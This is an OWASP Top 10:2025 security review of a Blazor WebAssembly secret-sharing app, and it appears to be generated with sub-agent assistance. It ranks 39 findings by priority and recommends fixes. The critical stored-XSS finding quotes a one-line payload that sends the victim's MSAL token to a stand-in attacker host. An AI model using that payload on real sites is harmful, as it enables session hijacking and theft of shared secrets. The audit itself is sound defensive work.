# OWASP Top 10:2025 Security Review — SafeExchange.BlazorPWA

**Review date:** 2026-04-14
**Repo:** `safeexchange.blazorpwa` (branch `features/security-hardening`, cut from `main` at `f368432`)
**Scope:** full codebase audit (Blazor WebAssembly PWA client, C# / .NET 8 targeting)
**Methodology:** OWASP Top 10:2025 — 10 parallel adversarial sub-agents, four-axis scoring (Severity × Exploitability × Exposure × Confidence → Priority)
**Sub-agent completion:** 10/10 ✔

---

## Summary

| Metric | Value |
|---|---|
| Total findings | **39** |
| P0 — Fix before next deploy | **1** |
| P1 — Fix this sprint | **7** |
| P2 — Fix this quarter | **15** |
| P3 — Backlog | **12** |
| P4 — Informational | **4** |

**By severity:** Critical × 1 · High × 6 · Medium × 18 · Low × 10 · Info × 4
**By category:** A01 × 3 · A02 × 3 · A03 × 3 · A04 × 5 · A05 × 3 · A06 × 5 · A07 × 2 · A08 × 2 · A09 × 4 · A10 × 9

> **Note on duplicates:** Four findings triangulate on the same `ValidateAuthority: false` flag from different angles (A01, A02, A04, A07). Two findings (A01-1 and A06-1) hit the same `CanEditObject` fail-open. They are listed under each category for traceability but should be fixed together.

---

## P0 — Fix Immediately

### [P0] [CRITICAL] Stored XSS via `MarkupString` rendering of unsanitized rich-text secret content
- **Category:** A05:2025 — Injection
- **CWE:** CWE-79, CWE-80
- **File:** `SafeExchange.Client.Web.Components/Pages/ViewData.razor:48`
- **Severity:** Critical · **Exploitability:** Easy · **Exposure:** Authenticated · **Confidence:** Confirmed
- **Why P0:** Stored XSS in a secret-sharing app is cascading credential theft. An attacker who has write access to any shared secret can craft a payload (`<img src=x onerror="fetch('https://atk/'+localStorage.getItem('msal.idtoken'))">`) via direct API call that bypasses Quill's paste sanitizer. When a victim (any co-user with read access) opens `/viewdata/{name}`, `@((MarkupString)this.compoundModel.MainData)` injects the raw HTML into the DOM. Payload exfiltrates the MSAL bearer token from `sessionStorage`, and the attacker replays against the backend to read **every secret the victim can access**.
- **Fix:** run HTML through a vetted sanitizer (e.g. `Ganss.Xss.HtmlSanitizer`) at read-and-write time, before binding to `MarkupString`. Defense-in-depth: add strict CSP (see A02-02).
- Full detail → [`A05-injection.md`](./A05-injection.md#a05-1-stored-xss-via-markupstring)

---

## P1 — Fix This Sprint

| # | Finding | Category | File |
|---|---|---|---|
| 1 | DOM XSS in custom Quill `CopyableBlot` via `innerHTML = value` | A05 | `richTextEditor.js:62` |
| 2 | Access-request flow has no client ceiling on requested permission scope; DTO mass-assignment of `SubjectId`/`SubjectName` | A06 | `CreateAccessRequest.razor`, `SubjectPermissionsInput.cs` |
| 3 | Chunked upload has no ordering/commit/integrity safeguards; `ChunkMetadata.Hash` ignored on read | A06 | `ApiClient.cs:406–437`, `SecretContentStream.cs:106–122` |
| 4 | PWA stale-session design — service worker serves cached pages and push subscription persists after logout | A06 | `service-worker.published.js:88–101`, `Authentication.razor:35–39` |
| 5 | `CreateFromCompoundModelAsync` returns `Status = "ok"` even when `GrantAccess` or attachment upload fails (partial commit) | A10 | `ApiClient.cs:146–206` |
| 6 | `DownloadToFileStreamAsync` commits partial file on mid-stream error and upgrades `DownloadStatus.InProgress → Success` in the outer `finally` | A10 | `ViewData.razor:375–449, 364` |
| 7 | `TryUpdateSecretAsync` silently swallows `DeleteContentMetadataAsync` failures with explicit `// no-op`; UI shows "updated successfully" | A10 | `EditData.razor:803–810` |

## P2 — Fix This Quarter

| # | Finding | Category | File |
|---|---|---|---|
| 1 | `CanEditObject()` fail-open when UPN claim is missing (returns `true`); duplicates A06-1 | A01 / A06 | `ViewData.razor:255–278` |
| 2 | No Content-Security-Policy / no security hardening headers (HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy) | A02 | `index.html`, hosting config |
| 3 | jQuery 3.3.1 slim shipped to production — CVE-2020-11022 / CVE-2020-11023 (`htmlPrefilter` XSS) | A03 | `SafeExchange.Client.Web.Components/wwwroot/js/jquery-3.3.1.slim.min.js` |
| 4 | No CI/CD / Dependabot / SBOM / SCA / lock files → zero automated patch pipeline | A03 | `.github/workflows/` (empty), `*.csproj` |
| 5 | MSAL bearer tokens held in `sessionStorage` (default) — exfil-able from any XSS | A04 | `ServicesHelper.cs:67–72` |
| 6 | URL path injection — every `ApiClient` method interpolates identifiers raw without `Uri.EscapeDataString` | A05 | `ApiClient.cs:135–437` |
| 7 | No 429/Retry-After handling anywhere; no idempotency keys on access-request/push-register endpoints | A06 | `ApiClient.cs` (all endpoints) |
| 8 | Logout does not unsubscribe push registration — server-side subscription persists, notifications leak to next user of shared browser | A07 | `Authentication.razor:35–39`, `NotificationsSubscriber.cs:84–109` |
| 9 | Silent `AccessTokenNotAvailableException` catches across 10+ sites — no telemetry, no notification to user | A09 | `StateContainer.cs`, all `Pages/*.razor` |
| 10 | No security events surfaced to the user on session expiry / silent redirect — users trained to "just click through" re-auth prompts | A09 | All pages with `exception.Redirect();` |
| 11 | `StateContainer.TryFetch*` pre-clears lists then falls through on non-ok responses — UI shows empty data as if nothing pending | A10 | `StateContainer.cs:88–243` |
| 12 | `async void OnTimerElapsed` in `ItemSearchDialog` catches only `AccessTokenNotAvailableException`; other exceptions swallowed by timer | A10 | `ItemSearchDialog.razor:323–341` |
| 13 | `SecretContentStream.Read` uses sync-over-async `.GetAwaiter().GetResult()` in Blazor WASM — deadlocks; state inconsistency on failure | A10 | `SecretContentStream.cs:113` |
| 14 | `UploadAttachmentsAsync` catches every exception per attachment; callers never read `attachment.Status` | A10 | `ApiClient.cs:208–266` |
| 15 | JS interop `RichTextEditor.SetHtml` unsanitized flow (related to A05-1 but separate edit-page sink) | A05 | `EditData.razor`, `richTextEditor.js` |

## P3 — Backlog

| # | Finding | Category |
|---|---|---|
| 1 | `ValidateAuthority: false` set unnecessarily for an Entra ID (not B2C) authority (consolidates 4 sub-agent findings) | A01 / A02 / A04 / A07 |
| 2 | `VapidOptions.PrivateKey` defined in a Blazor WASM class library — latent trap: any future bind would publish the key to every browser | A04 |
| 3 | No transport-scheme validation on `BackendApi:BaseAddress` — operator misconfiguration could downgrade to HTTP | A04 |
| 4 | `Microsoft.Extensions.*` packages pinned at `8.0.0` baseline (not latest 8.0.x servicing) | A03 |
| 5 | Service-worker `notificationclick` handler opens `payload.url` with no origin allowlist — phishing on backend/VAPID compromise | A08 |
| 6 | `ProcessResponseAsync` returns raw exception type/message and even raw response body as user-visible error strings | A10 |
| 7 | `Console.WriteLine` used as ad-hoc logger bypassing `ILogger` and log-level config | A09 |
| 8 | No global `ErrorBoundary` and no central telemetry — uncaught exceptions go to default Blazor reload banner | A09 |
| 9 | `AddFiles` file-reader catches swallow errors to `Console.WriteLine` — files silently dropped | A10 |
| 10 | URL path segments not percent-encoded (client-smuggling primitive — same root cause as P2 item #6, filed separately by A01) | A01 |
| 11 | PWA manifest missing explicit `scope` / `id` | A02 |
| 12 | `ProcessResponseAsync` deserializes without content-type or status-code gate | A08 |

## P4 — Informational

| # | Finding | Category |
|---|---|---|
| 1 | No client-side end-to-end encryption — confidentiality of secret content relies entirely on TLS + backend honesty (design note) | A04 |
| 2 | PWA manifest has no explicit `scope` (redundant with P3 #11) | A02 |
| 3 | URL path identifiers not percent-encoded (A01 variant — folded into P2 #6) | A01 |
| 4 | HTTP response body deserialized without content-type check (defense-in-depth only) | A08 |

---

## Reviewer's Top 3 Priorities

1. **Ship an HTML sanitizer and a strict CSP.** The stored XSS in `MarkupString` (P0) is the only Critical finding, and the absence of CSP (P2) directly amplifies its blast radius. Both fixes are surgical: wrap `MainData` in `HtmlSanitizer.Sanitize()` at bind time, and add a `<meta http-equiv="Content-Security-Policy">` tag to `index.html` restricting `script-src 'self' 'wasm-unsafe-eval'`, `connect-src 'self' https://login.microsoftonline.com https://<api>`, `object-src 'none'`, `base-uri 'none'`, `frame-ancestors 'none'`.

2. **Close every silent "success on failure" path.** P1 items 5, 6, and 7 share a single anti-pattern: the client happily reports success even when a constituent API call failed. In a secrets-sharing tool where the user's mental model of "shared", "uploaded", and "deleted" *must* match reality, these are high-impact integrity bugs. Add an aggregation helper that surfaces any non-`ok` sub-result as a loud failure, and delete every `// no-op` / `// TODO` comment inside a catch or status check.

3. **Wire up the missing supply-chain + telemetry backbone.** Add a minimal `.github/workflows/ci.yml` with `dotnet list package --vulnerable --include-transitive`, a `dependabot.yml` for NuGet + GitHub Actions, `packages.lock.json` with `RestorePackagesWithLockFile=true`, and a global `ErrorBoundary` in `App.razor`. Without these, future CVEs and future silent failures go undetected — you cannot harden what you cannot observe.

---

## Systemic Observations

1. **Frontend-as-authority anti-pattern.** The client makes security-relevant decisions (can-edit, request permission scope, session validity) based on client-visible state. A single design change — "the server returns `canEdit`/`canDelete`/`canGrant` flags per object and the client never computes them locally" — eliminates A01-1, A06-1, and significantly shrinks A06-2's attack surface.

2. **Silent catches everywhere.** `AccessTokenNotAvailableException.Redirect()` is called in 10+ locations with zero telemetry, zero user-facing explanation, and zero structured logging. This is simultaneously an A09 problem (no observability) and an A10 problem (fail-open/fail-silent), and it's one of the root causes of almost every A10 finding.

3. **Fail-open defaults.** `CanEditObject` returns `true` when UPN is missing. `CreateFromCompoundModelAsync` returns `Status = "ok"` when a constituent step failed. `DownloadToFileStreamAsync` upgrades `InProgress → Success` in the outer `finally`. `StateContainer.TryFetch*` returns empty lists (not null) on failure. Deny-by-default / report-failure-loudly is not the convention here.

4. **No threat-model documentation.** The product is a secrets-sharing app — it deserves a written client-side threat model that states "the backend is authoritative", "the client is an untrusted rendering surface", and "confidentiality is TLS-bound (no E2E)". Without this, every new contributor will re-invent the fail-open patterns above.

---

## Methodology

- **Standard:** OWASP Top 10:2025 (https://owasp.org/Top10/2025/)
- **Approach:** 10 parallel sub-agents, one per category, each bounded to ~30 file reads
- **Scoring:** Four-axis rubric — Severity × Exploitability × Exposure × Confidence → Priority
- **Out of scope:** Backend service (`safeexchange-staging.azurewebsites.net`), dynamic analysis, fuzzing, dependency CVE scanning at scale, compliance frameworks
- **Branch:** `features/security-hardening`

## Category Detail Files

- [A01 — Broken Access Control](./A01-broken-access-control.md)
- [A02 — Security Misconfiguration](./A02-security-misconfiguration.md)
- [A03 — Software Supply Chain Failures](./A03-software-supply-chain-failures.md)
- [A04 — Cryptographic Failures](./A04-cryptographic-failures.md)
- [A05 — Injection](./A05-injection.md)
- [A06 — Insecure Design](./A06-insecure-design.md)
- [A07 — Authentication Failures](./A07-authentication-failures.md)
- [A08 — Software or Data Integrity Failures](./A08-software-or-data-integrity-failures.md)
- [A09 — Security Logging and Alerting Failures](./A09-security-logging-and-alerting-failures.md)
- [A10 — Mishandling of Exceptional Conditions](./A10-mishandling-of-exceptional-conditions.md)
